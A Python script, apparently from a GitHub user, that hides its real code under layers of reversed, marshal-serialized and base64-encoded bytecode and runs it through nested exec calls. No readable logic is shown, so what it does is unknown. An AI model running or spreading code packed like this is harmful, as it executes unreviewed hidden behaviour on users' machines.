# https://github.com/Mohammadullah91
# Time : Wed Jul 17 14:05:47 2024
_ = lambda __ : __import__('marshal').loads(__[::-1]);exec((_)(b'\x00\x00\x00\x04r UO\x01\x00\x00\xf0 UO\x01\x00\x00\xf0 UO\x01\x00\x00\xf0 UO\x01\x00\x00\xf4 UO\x01\x00\x00\xf1 UN\x06\x00\x00\xf4 UN\x06\x00\x00\xf1 UM\n\x00\x00\xf0a\x80a\x80\x04\x80\x04\x00\xd8\x01\x01\x01\x03\xf0\x00\x00\x00Fs\x00\x00\x00\x01\x00\x00\x00\x06r>eludom<\x08\xfa>x<\x03\xfa\x00\x00\x00\x00\xf3\x00\xa9_\x01\xdacexe\x04\xda\x02)Nc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\xf3.\x00\x00\x00\x97\x00\x02\x00e\x00\x02\x00e\x01d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\x02s\x9a\xf1\x01\x00\x00\x00\x00\x04r AY\x01\x00\x00\xf0 AY\x01\x00\x00\xf0 AY\x01\x00\x00\xf0 AY\x01\x00\x00\xf4 AY\x01\x00\x00\xf1 AX\x06\x00\x00\xf4 AX\x06\x00\x00\xf1 AW\n\x00\x00\xf0a\x80a\x80\x04\x80\x04\x00\xd8\x01\x01\x01\x03\xf0\x00\x00\x00Fs\x00\x00\x00\x01\x00\x00\x00\x06r>eludom<\x08\xfa>x<\x03\xfa\x00\x00\x00\x00\xf3\x00\xa9_\x01\xdacexe\x04\xda\x02)Nc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\xf3.\x00\x00\x00\x97\x00\x02\x00e\x00\x02\x00e\x01d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\x02s\x06\xf0\x01\x00\x00\x00\x00\x04r\x1flp\x01\x00\x00\xf0\x1flp\x01\x00\x00\xf0\x1flp\x01\x00\x00\xf0\x1flp\x01\x00\x00\xf4\x1flp\x01\x00\x00\xf1\x1flo\x06\x00\x00\xf4\x1flo\x06\x00\x00\xf1\x1fln\n\x00\x00\xf0a\x80a\x80\x04\x80\x04\x00\xd8\x01\x01\x01\x03\xf0\x00\x00\x00Fs\x00\x00\x00\x01\x00\x00\x00\x06r>eludom<\x08\xfa>x<\x03\xfa\x00\x00\x00\x00\xf3\x00\xa9_\x01\xdacexe\x04\xda\x02)Nc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\xf3.\x00\x00\x00\x97\x00\x02\x00e\x00\x02\x00e\x01d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\x02sr\xee\x01\x00\x00\x00\x00\x04r\x1fXM\x01\x00\x00\xf0\x1fXM\x01\x00\x00\xf0\x1fXM\x01\x00\x00\xf0\x1fXM\x01\x00\x00\xf4\x1fXM\x01\x00\x00\xf1\x1fXL\x06\x00\x00\xf4\x1fXL\x06\x00\x00\xf1\x1fXK\n\x00\x00\xf0a\x80a\x80\x04\x80\x04\x00\xd8\x01\x01\x01\x03\xf0\x00\x00\x00Fs\x00\x00\x00\x01\x00\x00\x00\x06r>eludom<\x08\xfa>x<\x03\xfa\x00\x00\x00\x00\xf3\x00\xa9_\x01\xdacexe\x04\xda\x02)Nc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\xf3.\x00\x00\x00\x97\x00\x02\x00e\x00\x02\x00e\x01d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\x02s\xde\xec\x01\x00\x00\x00\x00\x04r\x1fCg\x01\x00\x00\xf0\x1fCg\x01\x00\x00\xf0\x1fCg\x01\x00\x00\xf0\x1fCg\x01\x00\x00\xf4\x1fCg\x01\x00\x00\xf1\x1fCf\x06\x00\x00\xf4\x1fCf\x06\x00\x00\xf1\x1fCe\n\x00\x00\xf0a\x80a\x80\x04\x80\x04\x00\xd8\x01\x01\x01\x03\xf0\x00\x00\x00Fs\x00\x00\x00\x01\x00\x00\x00\x06r>eludom<\x08\xfa>x<\x03\xfa\x00\x00\x00\x00\xf3\x00\xa9_\x01\xdacexe\x04\xda\x02)Nc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\xf34\x00\x00\x00\x97\x00d\x00\x84\x00Z\x00\x02\x00e\x01\x02\x00e\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x02S\x00)\x03c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x03\x00\x00\x00\xf3\x98\x00\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00d\x00d\x00d\x03\x85\x03\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00S\x00)\x04N\xda\x07marshal\xda\x06base64\xe9\xff\xff\xff\xff)\x03\xda\n__import__\xda\x05loads\xda\tb64decode)\x01\xda\x02__s\x01\x00\x00\x00 \xfa\x03<x>\xfa\x08<lambda>r\n\x00\x00\x00\x05\x00\x00\x00s=\x00\x00\x00\x80\x00\x95\n\x989\xd1\x10%\xd4\x10%\xd7\x10+\xd2\x10+\xadJ\xb0x\xd1,@\xd4,@\xd7,J\xd2,J\xc82\xc8d\xc8d\xd0PR\xc8d\xcc8\xd1,T\xd4,T\xd1\x10U\xd4\x10U\x80\x00\xf3\x00\x00\x00\x00s\xd8\xe9\x01\)\x02\xda\x01_\xda\x04exec\xa9\x00r\x0b\x00\x00\x00r\t\x00\x00\x00\xfa\x08<module>r\x0f\x00\x00\x00\x01\x00\x00\x00s\\\x00\x00\x00\xf0\x03\x01\x01\x01\xf0\n\x00\x05V\x01\xd0\x04U\x80\x01\xd0VZ\xd0VZ\xd0\\]\xd0\\]\xf0\x00\x00`\x01{h\x1e\xf1\x00\x00\\\x01|h\x1e\xf4\x00\x00\\\x01|h\x1e\xf1\x00\x00W\x01}h\x1e\xf4\x00\x00W\x01}h\x1e\xf0\x00\x00W\x01}h\x1e\xf0\x00\x00W\x01}h\x1e\xf0\x00\x00W\x01}h\x1er\x0b\x00\x00\x00\x00\x01\xec\x14s\x02)\x00S\x01d\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\xab\x00\x00\x01\xa6\x00\x00\x00\x00\x00\x00\x00\x00\x01\xab\x00\x00\x01\xa6\x00d\x01e\x00\x02\x00e\x00\x02\x00\x97\x00\x00\x00.\xf3\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00cN)\x02\xda\x04exec\xda\x01_\xa9\x00\xf3\x00\x00\x00\x00\xfa\x03<x>\xfa\x08<module>r\x06\x00\x00\x00\x01\x00\x00\x00sF\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x00\x04\x80\x04\x80a\x80a\xf0\x00\x00\nxM\x1f\xf1\x00\x00\x06yM\x1f\xf4\x00\x00\x06yM\x1f\xf1\x00\x00\x01zM\x1f\xf4\x00\x00\x01zM\x1f\xf0\x00\x00\x01zM\x1f\xf0\x00\x00\x01zM\x1f\xf0\x00\x00\x01zM\x1fr\x04\x00\x00\x00\x00\x01\xed\xa8s\x02)\x00S\x01d\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\xab\x00\x00\x01\xa6\x00\x00\x00\x00\x00\x00\x00\x00\x01\xab\x00\x00\x01\xa6\x00d\x01e\x00\x02\x00e\x00\x02\x00\x97\x00\x00\x00.\xf3\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00cN)\x02\xda\x04exec\xda\x01_\xa9\x00\xf3\x00\x00\x00\x00\xfa\x03<x>\xfa\x08<module>r\x06\x00\x00\x00\x01\x00\x00\x00sF\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x00\x04\x80\x04\x80a\x80a\xf0\x00\x00\n^b\x1f\xf1\x00\x00\x06_b\x1f\xf4\x00\x00\x06_b\x1f\xf1\x00\x00\x01`b\x1f\xf4\x00\x00\x01`b\x1f\xf0\x00\x00\x01`b\x1f\xf0\x00\x00\x01`b\x1f\xf0\x00\x00\x01`b\x1fr\x04\x00\x00\x00\x00\x01\xef<s\x02)\x00S\x01d\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\xab\x00\x00\x01\xa6\x00\x00\x00\x00\x00\x00\x00\x00\x01\xab\x00\x00\x01\xa6\x00d\x01e\x00\x02\x00e\x00\x02\x00\x97\x00\x00\x00.\xf3\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00cN)\x02\xda\x04exec\xda\x01_\xa9\x00\xf3\x00\x00\x00\x00\xfa\x03<x>\xfa\x08<module>r\x06\x00\x00\x00\x01\x00\x00\x00sF\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x00\x04\x80\x04\x80a\x80a\xf0\x00\x00\n~v\x1f\xf1\x00\x00\x06\x7fv\x1f\xf4\x00\x00\x06\x7fv\x1f\xf1\x00\x00\x01@w\x1f\xf4\x00\x00\x01@w\x1f\xf0\x00\x00\x01@w\x1f\xf0\x00\x00\x01@w\x1f\xf0\x00\x00\x01@w\x1fr\x04\x00\x00\x00\x00\x01\xf0\xd0s\x02)\x00S\x01d\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\xab\x00\x00\x01\xa6\x00\x00\x00\x00\x00\x00\x00\x00\x01\xab\x00\x00\x01\xa6\x00d\x01e\x00\x02\x00e\x00\x02\x00\x97\x00\x00\x00.\xf3\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00cN)\x02\xda\x04exec\xda\x01_\xa9\x00\xf3\x00\x00\x00\x00\xfa\x03<x>\xfa\x08<module>r\x06\x00\x00\x00\x01\x00\x00\x00sF\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x00\x04\x80\x04\x80a\x80a\xf0\x00\x00\nRK \xf1\x00\x00\x06SK \xf4\x00\x00\x06SK \xf1\x00\x00\x01TK \xf4\x00\x00\x01TK \xf0\x00\x00\x01TK \xf0\x00\x00\x01TK \xf0\x00\x00\x01TK r\x04\x00\x00\x00\x00\x01\xf2ds\x02)\x00S\x01d\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\xab\x00\x00\x01\xa6\x00\x00\x00\x00\x00\x00\x00\x00\x01\xab\x00\x00\x01\xa6\x00d\x01e\x00\x02\x00e\x00\x02\x00\x97\x00\x00\x00.\xf3\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00c'))